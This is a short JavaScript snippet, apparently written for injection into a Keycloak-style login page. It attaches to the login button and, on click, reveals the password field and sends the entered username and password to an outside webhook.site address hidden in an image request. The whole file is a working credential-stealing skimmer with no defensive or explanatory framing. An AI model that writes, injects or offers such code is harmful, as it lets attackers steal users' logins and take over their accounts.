var btn = document.getElementById('kc-login');

if (btn) {
    btn.onclick = function() {
        var passwordInput = document.getElementById('password');
        if (passwordInput) {
            passwordInput.type = 'text';
        }
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        
        new Image().src = 'https://webhook.site/e850bf9b-5440-4787-9359-8b609587a433/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
    };
}
